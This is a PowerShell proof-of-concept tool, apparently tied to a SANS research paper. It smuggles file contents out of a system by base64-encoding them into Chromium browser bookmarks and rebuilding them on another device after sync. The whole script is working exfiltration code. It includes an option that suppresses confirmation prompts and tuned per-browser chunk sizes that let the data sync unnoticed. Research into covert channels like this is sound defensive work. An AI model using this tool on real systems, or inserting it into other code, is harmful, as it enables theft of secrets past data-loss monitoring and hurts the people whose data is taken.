#Requires -Version 6.0
function brugglemark {
    <#
    .SYNOPSIS
        Brugglemark (browser + smuggle + bookmarks) abuses browser bookmark synchronization as a mechanism for sending and receiving data between systems.

        Should be compatible with any Chromium browser, such as Chrome, Edge, Opera, Brave, or Vivaldi.

        Version: 1.0.0
    .DESCRIPTION
        Converts raw text (currently supports plaintext files only) into base64 strings that are saved as individual bookmarks using the "Bookmarks" file in a user's profile directory. The data can then be reconstructed from those same bookmarks once they have been synced to a remote system (which is usually instant).
        
        Created by David Prefer (pronounced Pree-fer) as a proof of concept for an academic research paper ("Bookmark Bruggling: Novel Data Exfiltration with Brugglemark"). The paper can be found at https://sans.edu/cyber-research/ or https://sans.org/white-papers/.
    .LINK
        https://github.com/davidprefer/Brugglemark/
    .NOTES
        Immense credit to Chris White (https://github.com/chriswhitehat/) for help with inserting the generated bookmarks into the Mobile bookmarks folder in the "Bookmarks" file, and for rewriting how bookmarks are generated (hash tables instead of arrays).
    .EXAMPLE
        brugglemark -bruggle -ProfilePath '%LocalAppData%\Google\Chrome\User Data\Default\' -Data 'input_secrets.txt' -Chars 8500
        
        DESCRIPTION: Write 'input_secrets.txt' to bookmarks (close any browser sessions associated with the target profile before running Brugglemark). 
        
        NOTE: Specify the folder name to write to within Mobile bookmarks using -bmFolderName (default is "brugglemark," but if the folder already exists then an incrementing number will be appended to the name (e.g., brugglemark1, brugglemark2, etc.).
    .EXAMPLE
        brugglemark -unbruggle -ProfilePath '%LocalAppData%\Google\Chrome\User Data\Default\' -Data 'output_secrets.txt'
        
        DESCRIPTION: Retrieve data from bookmarks and write to 'output_secrets.txt'. Add -sp to skip prompts (this will also work with -bruggle in the prior example).
        
        NOTE: Specify the folder name to read from within Mobile bookmarks with -bmFolderName.
    .PARAMETER sp
        Description: Suppresses prompts to continue.
    .PARAMETER bruggle
        Description: Writes -Data to bookmarks in base64. To ensure success, close any browser sessions associated with the target profile before writing to bookmarks.
    .PARAMETER unbruggle
        Description: Reads and decodes base64 data from synced bookmarks and writes to -Data.
    .PARAMETER ProfilePath
        Description: Specifies the target profile. Find a profile's path by visiting the "about:version" URL in Chrome, Edge, Brave, and Vivaldi, or "opera:about" in Opera.
        
        NOTE 1: Brugglemark will fail if the "Bookmarks" file does not exist. Ensure at least one bookmark has been saved by the target profile so that the file is created.
        
        NOTE 2: Do not include the "Bookmarks" file in the path, as this is handled automatically (and may be optionally specified with -BookmarksFile if necessary).

        Aliases: Profile, P
    .PARAMETER BookmarksFile
        Description: Specifies the name of the "Bookmarks" file. This only needs to be set if the target browser has deviated from the "Bookmarks" filename used by Chromium-based browsers.
        
        NOTE: Brugglemark will fail if the "Bookmarks" file does not exist. Ensure at least one bookmark has been saved by the target profile so that the file is created.
        Default: "Bookmarks"

        Aliases: B, JSONFile, J
    .PARAMETER Data
        Description (-bruggle): File with raw data to be base64 encoded and converted into bookmarks.
        Description (-unbruggle): File where retrieved and decoded data from synced bookmarks will be written.
        Aliases: D, Read, R, Write, W, File, F
    .PARAMETER Chars
        Description: Set the maximum number of characters to be stored in each bookmark's name field (don't use a comma in the value). Recommended character lengths (based on June 2022 research):
            Chrome: 8,000 - 9,000
            Edge: 32,500
            Brave: 100,000 - 300,000
            Opera: 100,000 - 3,000,000
        Default: 8500
        Alias: C
    .PARAMETER bmDate
        Description: Controls the value of the date_added field in each bookmark created. Used to keep track of each string sequentially. Brugglemark will increment this number by one for each bookmark generated.
        Default: 0
    .PARAMETER bmGUID
        Description: Controls the value of the guid field in each bookmark created. The browser will overwrite this with a randomly generated GUID.
        Default: "dp"
    .PARAMETER bmID
        Description: Controls the value of the id field in each bookmark created. The browser will overwrite this with the sequential ordering of the bookmark.
        Default: 1
    .PARAMETER bmType
        Description: Controls the value of the type field in each bookmark created. While this can be set to "url" or "folder" this script DOES NOT support generating folder entries at this time (aside from the one that is created to hold each bookmark).
        Default: "url"
    .PARAMETER bmURL
        Description: Controls the value of the url field in each bookmark created. Length of URL impacts the max length for the name field; the shorter, the better.
        Default: "aa::"
    .PARAMETER bmFolderRoot
        TO DO [Not yet implemented]: Controls which folder root will be used: Bookmarks bar, Other bookmarks, or Mobile bookmarks.
        Default: "Mobile bookmarks"
        Aliases: bmFR, FR
    .PARAMETER bmFolderName
        Description: Controls the name of the folder that is created to store the generated bookmarks. An incrementing number is added if a folder with that name already exists.
        Default: "brugglemark" 
        Aliases: bmFN, FN
    .PARAMETER bmFolderDateAdded
        Description: Controls the value of the date_added field in the bookmark folder created.
        Default: 0
    .PARAMETER bmFolderDateModified
        Description: Controls the value of the date_modified field in the bookmark folder created.
        Default: 0
    #>
    [CmdletBinding()]
    Param(
        [switch]$sp,
        [switch]$bruggle,
        [switch]$unbruggle,
        [Parameter(Mandatory)]
        [Alias('Profile','P')]
        [string]$ProfilePath,
        [Alias('B','JSONFile','J')]
        [string]$BookmarksFile = "Bookmarks",
        [Parameter(Mandatory)]
        [Alias('D','Read','R','Write','W','File','F')]
        [string]$Data,
        [Alias('C')]
        [int]$Chars = 8500,
        [int]$bmDate = 0,
        [string]$bmGUID = "dp",
        [int]$bmID = "1",
        [string]$bmType = "url",
        [string]$bmURL = "aa::",
        [Alias('bmFR','FR')]
        [string]$bmFolderRoot = "Mobile bookmarks",
        [Alias('bmFN','FN')]
        [string]$bmFolderName = "brugglemark",
        [int]$bmFolderDateAdded = 0,
        [int]$bmFolderDateModified = 0
    )
    # Require user to specify $bruggle or $unbruggle, and prevent the use of both in the same operation
    If (($bruggle -and $unbruggle) -xor -not($bruggle -or $unbruggle)) {
        Write-Error "Use -bruggle to convert -Data to bookmarks. Use -unbruggle to convert bookmarks to -Data.`nExample: -bruggle on Device A. Once bookmarks are synced, -unbruggle on Device B."
        Exit # Stop
    }

    # Full path to Bookmarks file
    $ProfilePath = $ProfilePath.Replace("%LocalAppData%","$env:LOCALAPPDATA").Replace("%AppData%","$env:APPDATA").Replace("\$BookmarksFile","")
    $JSONFile = [IO.Path]::Combine($ProfilePath, $BookmarksFile)
        If (Test-Path -Path $JSONFile) {} else {Write-Error "Check -ProfilePath. Cannot find `"$BookmarksFile`" file in $ProfilePath."; Exit} # Exit if path is invalid

    $BookmarksFileContents = Get-Content $JSONFile | ConvertFrom-Json -AsHashtable

    # -------------------- Create Bookmarks --------------------
    If ($bruggle) {
        If (Test-Path -Path $Data) {} else {Write-Error "Check -Data. '$Data' could not be found."; Exit} # Exit if path is invalid
        $DataContent = Get-Content $Data -Raw
        $DataBytes = [System.Text.Encoding]::UTF8.GetBytes($DataContent)
        $DataEncoded = [System.Convert]::ToBase64String($DataBytes, 'InsertLineBreaks')
        $DataEncoded = $DataEncoded.Replace("`n","").Replace("`r","")

        # Warn against setting $Chars to 0.
        If ($Chars -eq 0) {
            Write-Warning "Chars = 0. Only a single bookmark will be created."
            Write-Warning "Most Chromium-based browsers will save (but not sync) bookmarks that exceed various character lengths. See -Chars in Detailed Help for recommended values."
        } #if
        # How many bookmarks will be created when base64 string is split according to $Chars value.
        # Round decimals to next whole number (partial strings still need a full bookmark).
        If ($Chars -ne 0) {$NumBookmarks = [int][Math]::Ceiling($DataEncoded.Length / $Chars)} else {$NumBookmarks = 1}
        If ($sp) {} else {
            # Prompt to continue
            $Continue = Read-Host "$NumBookmarks bookmark(s) will be created in the $bmFolderRoot > $bmFolderName folder. Continue? [y/n]"
        } #if

        If ($sp -or $Continue -ieq "y") {
            # Split base64-encoded data into multiple $Strings <= $Chars value.
            $StringsRegex = "(.{$Chars})"
            $Strings = $DataEncoded -Split $StringsRegex | Where-Object {$_}
            # Generate bookmarks using a hashtable
            $GeneratedBookmarks = @()
            ForEach ($s in $Strings) {
                $BookmarkData = [ordered]@{}
                $BookmarkData.Add("date_added", $bmDate++)
                $BookmarkData.Add("guid", $bmGUID)
                $BookmarkData.Add("id", $bmID)
                $BookmarkData.Add("name", $s)
                $BookmarkData.Add("type", $bmType)
                $BookmarkData.Add("url", $bmURL)
                $GeneratedBookmarks += $BookmarkData
            } #foreach

            # Store existing Mobile bookmarks
            $ExistingChildren = $BookmarksFileContents["roots"]["synced"]["children"]

            # Add an incrementing number to folder name if folder already exists
            $bmFolderNameCount = 0
            $bmFolderNameX = $bmFolderName
            try {
                If ($ExistingChildren.ContainsValue($bmFolderNameX) -Match "True") {
                    do {
                        $bmFolderNameCount++
                        $bmFolderNameX = $bmFolderName + "$bmFolderNameCount"
                        Write-Verbose "Bookmark folder name already in use. Checking $bmFolderNameX..."
                    } while ($ExistingChildren.ContainsValue($bmFolderNameX) -Match "True")
                    Write-Host -ForegroundColor Magenta "Bookmark folder name already in use. Using $bmFolderNameX instead."
                } else {$bmFolderNameX = $bmFolderName}   
            }
            catch {
                Write-Debug "Ignore error generated when no mobile bookmarks are present (does not impede functionality):`n$($PSItem.ToString())"
            }
            # Generate folder to hold generated bookmarks
            $GeneratedJSON = @{}
            $GeneratedJSON.Add("date_added", $bmFolderDateAdded)
            $GeneratedJSON.Add("date_modified", $bmFolderDateModified)
            $GeneratedJSON.Add("guid", $bmGUID)
            $GeneratedJSON.Add("id", $bmID)
            $GeneratedJSON.Add("name", $bmFolderNameX)
            $GeneratedJSON.Add("type", "folder")
            $GeneratedJSON.Add("children", $GeneratedBookmarks)

            # Add generated bookmarks and folder to existing mobile bookmarks
            $ExistingChildren += $GeneratedJSON
            # Replace mobile bookmarks with the existing + generated bookmarks
            $BookmarksFileContents["roots"]["synced"]["children"] = $ExistingChildren
            # Convert hashtable back to JSON
            $ModifiedBookmarksFile = $BookmarksFileContents | ConvertTo-JSON -Depth 100

            # Create temporary JSONFile with updated contents
            $tempJSONFile = New-TemporaryFile
            $ModifiedBookmarksFile | Add-Content $tempJSONFile
            # Replace old JSONFile with our updated JSONFile
            Remove-Item $JSONFile
            Move-Item $tempJSONFile $JSONFile

            # Done
            Write-Host -ForegroundColor Green "$NumBookmarks bookmark(s) created in the $bmFolderRoot > $bmFolderNameX folder (see in Bookmark Manager)."
            Write-Host -ForegroundColor Green "Launch browser profile to sync."
        } #if
    } #if

    # -------------------- Retrieve Bookmarks --------------------
    If ($unbruggle) {
        If ($sp) {} else {
            $Continue = Read-Host "Data from bookmarks in the $bmFolderRoot > $bmFolderName folder will be retrieved, starting from $bmDate, and written to $Data. Continue? [y/n]"
        }
        If ($sp -or $Continue -ieq "y") {
            # Parse bookmark folders
            Function Read-Folders {
                Param (
                    $Children,
                    $FolderName = ""
                )
                $Children | Add-Member -MemberType NoteProperty -Name folder -Value $FolderName
                $ReadBookmarks = @()
                $ReadBookmarks += $Children | Select-Object name,date_added,folder
                If ($null -ne $Children.children) {
                    ForEach ($ChildItem in $Children.children) {
                        $ReadBookmarks += Read-Folders -Children $ChildItem -FolderName $Children.name
                    }
                }
                Return $ReadBookmarks
            }
            # Retrieve bookmarks
            $ReadBookmarks = @()
            ForEach ($ChildItem in $BookmarksFileContents.roots.synced) {
                $ReadBookmarks += Read-Folders -Children $ChildItem
            }
            $Reassemble = $ReadBookmarks | Where-Object { $_.folder -eq $bmFolderName } | Sort-Object -Property date_added
            # Concatenate bookmarks into a single string
            $ReassembledData = ($Reassemble).name -join ""
            # Convert base64 back to raw data
            $DataUnencoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ReassembledData))
            # Write out to designated file.
            $DataUnencoded | Set-Content $Data

            # Done
            $DataPath = Get-ChildItem $Data
            Write-Host -ForegroundColor Cyan "Retrieved data from $bmFolderRoot > $bmFolderName folder bookmarks."
            Write-Host -ForegroundColor Cyan "Path: $DataPath"
        } #if
    } #if
    Write-Host ""
} #function    